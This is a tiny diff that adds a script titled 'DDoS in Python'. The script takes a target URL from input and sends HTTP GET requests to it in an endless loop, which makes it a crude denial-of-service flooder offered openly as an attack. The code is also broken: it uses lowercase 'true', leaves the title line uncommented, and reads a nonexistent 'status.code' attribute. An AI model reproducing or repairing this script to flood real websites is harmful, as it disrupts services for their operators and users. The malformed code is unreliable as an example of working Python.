@@ -1,0 +1,9 @@
+DDoS in Python
+import requests
+
+target = input()
+
+while true:
+    r = requests.get(target)
+
+    print(r.status.code)
